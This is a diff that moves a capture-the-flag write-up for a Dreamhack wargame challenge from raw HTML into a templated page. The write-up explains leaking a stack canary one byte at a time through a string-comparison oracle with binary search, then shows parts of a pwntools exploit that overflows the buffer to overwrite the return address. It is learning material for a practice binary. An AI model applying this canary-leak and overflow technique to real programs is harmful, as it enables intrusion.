@@ -1,22 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>milkbomb11</title>
-    <link rel="stylesheet" href="/style.css">
-</head>
-<body>
-
-    <header>
-        <h1>milkbomb11</h1>
-        <a href="/index.html">[to index]</a>
-    </header>
-
-    <main>
-        <p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/980">here</a></p>
-        <p>The discompilation of the target program is as below.</p>
-        <pre><code>
+---
+title: newstrcmp
+---
+<p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/980">here</a></p>
+<p>The discompilation of the target program is as below.</p>
+{% raw %}
+<pre><code>
 
 void newstrcmp(char *s1,long s2,int *result(index,(s1>=s2=1,s1&lt;s2=-1)))
 {
@@ -112,21 +100,30 @@ undefined8 main(void)
   }
   return 0;
 }
-        </code></pre>
-        <p>We can deduce that the stack frame of <code>main</code> will look like below from the disassembly and decompilation.</p>
-        <img src="main_stackframe.png" width="20%" height="auto">
-        <p>
-            As you can see, a canary is blocking us from using BOF to overwrite the return address. So we need to leak the value of the canary.
-            Thankfully, since the program compares the two string <code>s1</code> and <code>s2</code>, we can use this information to repeatedly
-            check a character of the canary 1 at a time. Furthermore, since it tells you if <code>s1</code> is bigger or smaller than <code>s2</code>, we can
-            use this information and perform a binary search to reduce the time complexity of the exploit.
-            One thing to note though is that when probing for the last canary byte, we will have to check whether the index at which the two strings differ changed,
-            rather than checking if the program returned "The two strings are the same!" since <code>s1</code> would've been filled up with non-null characters by then,
-            causing the string comparison function to think that <code>s1</code> is longer than what it actually is intended to be.
-            After figuring out the canary, creating a payload to overwrite the return address is trivial. 
-            The exploit code is as below.
-        </p>
-        <pre><code>
+</code></pre>
+{% endraw %}
+<p>We can deduce that the stack frame of <code>main</code> will look like below from the disassembly and decompilation.
+</p>
+<img src="main_stackframe.png" width="20%" height="auto">
+<p>
+  As you can see, a canary is blocking us from using BOF to overwrite the return address. So we need to leak the value
+  of the canary.
+  Thankfully, since the program compares the two string <code>s1</code> and <code>s2</code>, we can use this information
+  to repeatedly
+  check a character of the canary 1 at a time. Furthermore, since it tells you if <code>s1</code> is bigger or smaller
+  than <code>s2</code>, we can
+  use this information and perform a binary search to reduce the time complexity of the exploit.
+  One thing to note though is that when probing for the last canary byte, we will have to check whether the index at
+  which the two strings differ changed,
+  rather than checking if the program returned "The two strings are the same!" since <code>s1</code> would've been
+  filled up with non-null characters by then,
+  causing the string comparison function to think that <code>s1</code> is longer than what it actually is intended to
+  be.
+  After figuring out the canary, creating a payload to overwrite the return address is trivial.
+  The exploit code is as below.
+</p>
+{% raw %}
+<pre><code>
 #!/usr/bin/python3
 from pwn import *
 
@@ -176,8 +173,5 @@ if __name__ == "__main__":
     p.sendafter(b"s2: ", b"A"*24 + canary + b"B"*8 + p64(flag))
     p.sendafter(b"Exit? (y/n): ", b"y")
     p.interactive()
-        </code></pre>
-        
-    </main>
-</body>
-</html>
+</code></pre>
+{% endraw %}
